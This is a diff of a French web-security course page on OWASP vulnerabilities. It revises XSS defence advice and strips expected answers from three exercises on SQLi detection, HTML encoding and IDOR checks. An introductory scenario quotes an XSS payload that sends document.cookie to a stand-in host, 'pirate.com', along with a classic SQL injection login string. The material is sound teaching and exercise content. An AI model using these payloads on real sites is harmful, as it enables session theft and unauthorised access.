@@ -13,7 +13,7 @@
 <link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&amp;display=swap">
 <link rel="stylesheet" href="/assets/css/tokens.css">
 <link rel="stylesheet" href="../assets/css/cours.css">
 <link rel="stylesheet" href="/assets/css/code-lab.css">
@@ -63,7 +63,7 @@
 
   <div class="box box--situation">
     <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-play"></use></svg> Mise en situation</div>
-    <p>Lors d’un test d’intrusion (pentest) sur une plateforme de commerce électronique, l’auditeur saisit <code>admin' OR '1'='1</code> dans le formulaire de connexion et accède instantanément au tableau de bord administrateur sans mot de passe. Plus loin, il poste un commentaire contenant <code>&lt;script&gt;fetch("http://pirate.com/?c=" + document.cookie)&lt;/script&gt;</code> qui vole la session de tous les clients consultant la fiche produit. Pourquoi ces failles applicatives continuent-elles de figurer en tête du classement OWASP depuis vingt ans ? Comment éradiquer définitivement les injections et neutraliser les failles XSS à la source ? Ce module détaille l’anatomie des vulnérabilités web et leurs parades logicielles.</p>
+    <p>Lors d’un test d’intrusion (pentest) sur une plateforme de commerce électronique, l’auditeur saisit <code>admin' OR '1'='1</code> dans le formulaire de connexion et accède instantanément au tableau de bord administrateur sans mot de passe. Plus loin, il poste un commentaire contenant <code>&lt;script&gt;fetch("http://pirate.com/?c=" + document.cookie)&lt;/script&gt;</code> qui vole la session de tous les clients consultant la fiche produit. Pourquoi ces failles applicatives continuent-elles de figurer en tête du classement OWASP depuis vingt ans ? Comment réduire les risques d’injection et de XSS avec des défenses adaptées au contexte ? Ce module détaille l’anatomie des vulnérabilités web et leurs parades logicielles.</p>
   </div>
 
   <div class="box box--objectifs">
@@ -128,11 +128,12 @@ cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (use
   </div>
 </div>
   <div class="box box--info">
-    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-info"></use></svg> Le bouclier à trois niveaux contre le XSS</div>
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-info"></use></svg> Défense en profondeur contre le XSS</div>
 <ol>
-  <li><strong>Échappement contextuel (Contextual Escaping) :</strong> Remplacer les entités HTML (<code>&amp;</code> &rarr; <code>&amp;amp;</code>, <code>&lt;</code> &rarr; <code>&amp;lt;</code>, <code>&gt;</code> &rarr; <code>&amp;gt;</code>, <code>"</code> &rarr; <code>&amp;quot;</code>, <code>'</code> &rarr; <code>&amp;#x27;</code>).</li>
-  <li><strong>Drapeaux de cookies sécurisés :</strong> Définir <code>HttpOnly</code> sur le cookie de session (le script pirate ne peut plus lire <code>document.cookie</code>) et <code>Secure</code> (transit HTTPS uniquement).</li>
-  <li><strong>Politique de sécurité de contenu (CSP) :</strong> En-tête HTTP <code>Content-Security-Policy: default-src 'self';</code> interdisant les scripts inline et domaines non autorisés.</li>
+  <li><strong>Encodage adapté au contexte :</strong> Dans du texte HTML, encoder les caractères spéciaux ; dans un attribut HTML correctement cité, utiliser l’encodeur approprié. Pour une URL, valider le schéma et la destination autorisés, encoder les composants, puis l’attribut si nécessaire. Cet encodage HTML ne rend pas sûre une insertion dans du JavaScript, un gestionnaire d’événement ou une URL <code>javascript:</code>.</li>
+  <li><strong>Récepteurs et HTML autorisé :</strong> Préférer <code>textContent</code> pour du texte dans un élément non exécutable. Si du HTML fourni par l’utilisateur est indispensable, employer un assainissement avec une bibliothèque maintenue et une politique adaptée ; l’encodage de texte et l’assainissement de HTML sont différents.</li>
+  <li><strong>Drapeaux de cookies sécurisés :</strong> <code>HttpOnly</code> empêche la lecture du cookie par <code>document.cookie</code> et <code>Secure</code> limite son envoi à HTTPS ; ils n’empêchent pas un script injecté d’agir avec la session.</li>
+  <li><strong>Politique de sécurité de contenu (CSP) :</strong> Une CSP restrictive réduit les possibilités d’exécution de scripts ; son efficacité dépend de ses directives et elle ne remplace pas les autres protections.</li>
 </ol>
   </div>
 
@@ -156,9 +157,11 @@ cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (use
 </div>
 
 <!-- code-labs:start -->
+  <div id="exercices">
   <h2>5. Études de cas &amp; applications pratiques</h2>
-  <p class="lead">Ces trois études de cas se réalisent directement dans la page. Compléter chaque grille d’analyse à partir des données du cas, puis lancer la validation pour vérifier les réponses critère par critère.</p>
-  <p>En cas d’hésitation, le bouton <strong>Expliquer mon erreur</strong> sollicite le tuteur pédagogique pour guider l’application de la méthodologie sans donner directement la solution.</p>
+  <p class="lead">Ces trois études de cas se réalisent directement dans la page. Complétez chaque grille d’analyse à partir des données du cas, puis lancez la validation pour vérifier vos réponses critère par critère.</p>
+  <p>La validation compare vos réponses aux attendus des cas affichés ; elle ne vérifie pas votre capacité à traiter toutes les situations.</p>
+  <p>En cas d’hésitation, le bouton <strong>Obtenir une aide formative générale</strong> fournit un conseil identique pour toutes les grilles, sans transmettre de réponse attendue ni utiliser le tuteur IA.</p>
 <div class="lab" id="cs2-c4-e1" data-lab
      data-exercise="cs2-c4-e1"
      data-language="analyse"
@@ -187,10 +190,12 @@ A_COMPLETER
     <h3 class="lab__title">Exercice 1 — Détecteur de motifs d’injection SQL (SQLi)</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
+      <span class="lab__formative">Formative</span>
       <span class="badge badge--n1">Niveau 1 — Acquisition</span>
     </div>
   </div>
   <div class="lab__body">
+    <p class="lab__formative-notice" id="cs2-c4-e1-formative-notice">Cette vérification est une aide à l’apprentissage : elle ne donne pas de note et ne valide pas les acquis.</p>
     <p class="lab__goal"><strong>Objectif :</strong> Détecteur de motifs d’injection SQL (SQLi)</p>
     <div class="lab__brief"><p>L’injection SQL permet à un attaquant de modifier la structure d’une requête exécutée par la base de données. Votre programme analyse une chaîne de saisie utilisateur à la recherche de signatures SQLi classiques (insensible à la casse) :
 - <code>' or </code>
@@ -206,9 +211,7 @@ Résultat d’analyse attendu :
 - Sinon : <code>ENTREE VALIDEE</code>.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Cas d’exemple</b><pre>admin' OR '1'='1</pre></div>
-      <div class="lab__sample-part"><b>Résolution attendue</b><pre>INJECTION SQL DETECTEE (motif: ' or )</pre></div>
     </div>
-    <p class="lab__note">Exemple de référence.</p>
     <details class="lab__hints">
       <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
       <ol>
@@ -224,7 +227,7 @@ Résultat d’analyse attendu :
      data-language="analyse"
      data-height="300"
      data-stdin="&lt;script&gt;alert(&quot;XSS &amp; Pwned&quot;);&lt;/script&gt;">
-  <script type="text/plain" data-lab-starter># Grille d'analyse (cs2-c4-e2) — Neutralisateur de charge utile XSS (HTML Sanitizer)
+  <script type="text/plain" data-lab-starter># Grille d'analyse (cs2-c4-e2) — Encodage pédagogique de texte HTML
 # Complétez la résolution demandée sous chaque cas ci-dessous :
 
 [Cas 1 — Test de validation 1]
@@ -244,33 +247,32 @@ A_COMPLETER
 A_COMPLETER
 </script>
   <div class="lab__head">
-    <h3 class="lab__title">Exercice 2 — Neutralisateur de charge utile XSS (HTML Sanitizer)</h3>
+    <h3 class="lab__title">Exercice 2 — Encodage pédagogique de texte HTML</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
+      <span class="lab__formative">Formative</span>
       <span class="badge badge--n2">Niveau 2 — Application</span>
     </div>
   </div>
   <div class="lab__body">
-    <p class="lab__goal"><strong>Objectif :</strong> Neutralisateur de charge utile XSS (HTML Sanitizer)</p>
-    <div class="lab__brief"><p>Les failles Cross-Site Scripting (XSS) surviennent lorsqu’une application web réinjecte des données utilisateur non filtrées dans le code HTML servi au navigateur. Pour neutraliser l’exécution de scripts, les cinq caractères critiques doivent être échappés en entités HTML dans l’ordre rigoureux suivant :
+    <p class="lab__formative-notice" id="cs2-c4-e2-formative-notice">Cette vérification est une aide à l’apprentissage : elle ne donne pas de note et ne valide pas les acquis.</p>
+    <p class="lab__goal"><strong>Objectif :</strong> Encoder cinq caractères pour afficher une chaîne comme texte HTML dans un élément non exécutable.</p>
+    <div class="lab__brief"><p>Dans cette grille, une chaîne doit être affichée comme texte HTML dans un élément ordinaire, non dans un script, un attribut ou une URL. Appliquez ces substitutions en commençant par le perluète :
 1. <code>&amp;</code> &rarr; <code>&amp;amp;</code>
 2. <code>&lt;</code> &rarr; <code>&amp;lt;</code>
 3. <code>&gt;</code> &rarr; <code>&amp;gt;</code>
 4. <code>"</code> &rarr; <code>&amp;quot;</code>
 5. <code>'</code> &rarr; <code>&amp;#x27;</code>
 
-Entrée : Une chaîne de caractères contenant potentiellement des balises ou du JavaScript.
-Résultat d’analyse attendu : La chaîne neutralisée.</p></div>
+Entrée : une chaîne quelconque. Résultat : la chaîne encodée selon ce modèle. Ce traitement ne garantit pas la sécurité dans un attribut, une URL ou du JavaScript ; il n’est pas un assainisseur de HTML. En pratique, privilégiez un récepteur de texte comme <code>textContent</code> et adaptez la protection à chaque contexte.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Cas d’exemple</b><pre>&lt;script&gt;alert("XSS &amp; Pwned");&lt;/script&gt;</pre></div>
-      <div class="lab__sample-part"><b>Résolution attendue</b><pre>&amp;lt;script&amp;gt;alert(&amp;quot;XSS &amp;amp; Pwned&amp;quot;);&amp;lt;/script&amp;gt;</pre></div>
     </div>
-    <p class="lab__note">Exemple de référence.</p>
     <details class="lab__hints">
       <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
       <ol>
-        <li>La faille XSS injecte des balises de script ou des attributs d’événements dynamiques dans le code HTML affiché.</li>
-        <li>L’assainissement convertit les chevrons et caractères réservés en entités HTML inoffensives.</li>
+        <li>Le modèle concerne uniquement une insertion en texte HTML, pas l'évaluation d'une URL ni l'exécution de JavaScript.</li>
+        <li>Encodez le perluète en premier, puis les quatre autres caractères ; l'assainissement de HTML autorisé est une autre opération.</li>
       </ol>
     </details>
   </div>
@@ -304,10 +306,12 @@ A_COMPLETER
     <h3 class="lab__title">Exercice 3 — Contrôleur d’accès contre les failles IDOR (Broken Object Level Auth)</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
+      <span class="lab__formative">Formative</span>
       <span class="badge badge--n3">Niveau 3 — Raisonnement</span>
     </div>
   </div>
   <div class="lab__body">
+    <p class="lab__formative-notice" id="cs2-c4-e3-formative-notice">Cette vérification est une aide à l’apprentissage : elle ne donne pas de note et ne valide pas les acquis.</p>
     <p class="lab__goal"><strong>Objectif :</strong> Contrôleur d’accès contre les failles IDOR (Broken Object Level Auth)</p>
     <div class="lab__brief"><p>Une faille IDOR (Insecure Direct Object Reference) permet à un utilisateur d’accéder aux ressources privées d’autrui simplement en modifiant un identifiant dans l’URL ou la requête.
 
@@ -318,9 +322,7 @@ Règles d’autorisation :
 3. Sinon : refus d’accès et alerte sécurité : <code>ALERTE IDOR: utilisateur &lt;user_id&gt; non autorise sur document &lt;requested_doc_id&gt; de &lt;owner_doc_id&gt;</code>.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Cas d’exemple</b><pre>u101;client;doc42;doc42_owner_u101</pre></div>
-      <div class="lab__sample-part"><b>Résolution attendue</b><pre>ALERTE IDOR: utilisateur u101 non autorise sur document doc42 de doc42_owner_u101</pre></div>
     </div>
-    <p class="lab__note">Exemple de référence.</p>
     <details class="lab__hints">
       <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
       <ol>
@@ -330,6 +332,7 @@ Règles d’autorisation :
     </details>
   </div>
 </div>
+  </div>
   <!-- code-labs:end -->
   <h2>6. QCM — niveau examen</h2>
 
@@ -395,7 +398,7 @@ Règles d’autorisation :
     <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-compass"></use></svg> Protocole en 4 étapes pour sécuriser les formulaires et APIs contre le Top 10 OWASP</div>
     <ol>
       <li>Systématiser les requêtes préparées avec liaisons de paramètres typés pour chaque accès à la base de données relationnelle ou NoSQL.</li>
-      <li>Échapper contextuellement chaque variable réinjectée dans le DOM HTML selon son emplacement (HTML body, attribut, script, style).</li>
+      <li>Privilégier les récepteurs de texte sûrs ; adapter l’encodage aux contextes HTML et attribut, valider les URL et éviter l’insertion de données non fiables dans du code JavaScript ou CSS.</li>
       <li>Durcir les cookies de session : forcer systématiquement les drapeaux HttpOnly, Secure et SameSite=Lax (ou Strict).</li>
       <li>Intégrer un contrôle d’accès systématique par politique (ex. CanAccess(user, document_id)) avant toute opération de lecture ou d’écriture.</li>
     </ol>
@@ -408,14 +411,14 @@ Règles d’autorisation :
     <ul>
       <li>Le Top 10 OWASP classe les failles applicatives majeures, dominé par Broken Access Control et les Injections.</li>
       <li>Les requêtes préparées neutralisent les injections SQL en dissociant la compilation de la requête des données entrantes.</li>
-      <li>Les failles XSS (stockée, réfléchie, DOM) se contrent par l’échappement HTML, la directive CSP et l’attribut de cookie HttpOnly.</li>
+      <li>Les protections XSS associent récepteurs sûrs, encodage selon le contexte, assainissement si du HTML est autorisé et mesures complémentaires comme CSP et HttpOnly.</li>
       <li>Le CSRF usurpe l’action de l’utilisateur authentifié et se bloque avec des jetons anti-CSRF et SameSite.</li>
       <li>Les failles IDOR exigent un contrôle rigoureux de l’appartenance de l’objet demandé à l’utilisateur de la session courante.</li>
     </ul>
     <h3>Checklist de maîtrise</h3>
     <ul class="check">
       <li>Je sais identifier une concaténation SQL vulnérable et la réécrire avec des requêtes préparées.</li>
-      <li>Je connais la liste exacte des 5 caractères spéciaux HTML à échapper impérativement contre le XSS (&, <, >, ", ').</li>
+      <li>Je distingue les contextes texte HTML, attribut, URL et JavaScript, ainsi que l’encodage et l’assainissement de HTML.</li>
       <li>Je comprends le rôle des drapeaux HttpOnly, Secure et SameSite sur les cookies.</li>
       <li>Je sais expliquer le fonctionnement d’une attaque CSRF et le rôle du jeton de synchronisation.</li>
       <li>Je sais concevoir une vérification de droits pour interdire les accès non autorisés de type IDOR.</li>
@@ -434,10 +437,10 @@ Règles d’autorisation :
     <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-chart"></use></svg> Comment vous auto-évaluer</div>
     <p>Le QCM ci-dessus est un test de maîtrise. Lisez votre pourcentage :</p>
     <div class="bands">
-      <div class="bandrow bandrow--low"><strong>< 50 % — </strong>&lt; 50 % — Revoyez le principe d’une injection SQL et la différence entre XSS et CSRF.</div>
-      <div class="bandrow bandrow--mid"><strong>50–69 % — </strong>Entraînez-vous sur la réécriture en requêvos préparées et l’échappement des entités XSS.</div>
+      <div class="bandrow bandrow--low"><strong>&lt; 50 % — </strong>Revoyez le principe d’une injection SQL et la différence entre XSS et CSRF.</div>
+      <div class="bandrow bandrow--mid"><strong>50–69 % — </strong>Entraînez-vous sur la réécriture en requêtes préparées et l’échappement des entités XSS.</div>
       <div class="bandrow bandrow--good"><strong>70–94 % — </strong>Solide : vous maîtrisez les vulnérabilités du Top 10 OWASP et leurs mécanismes de défense.</div>
-      <div class="bandrow bandrow--top"><strong>≥ 95 % — </strong>Excellent : passe à l’authentification avancée, aux JWT et au contrôle RBAC au module 5.</div>
+      <div class="bandrow bandrow--top"><strong>≥ 95 % — </strong>Excellent : passez à l’authentification avancée, aux JWT et au contrôle RBAC au module 5.</div>
     </div>
     <p style="margin-top:12px"><label class="checkbox"><input type="checkbox" data-mark-done> <span>Je considère ce chapitre maîtrisé (≥ 95 % au test de maîtrise).</span></label></p>
   </div>
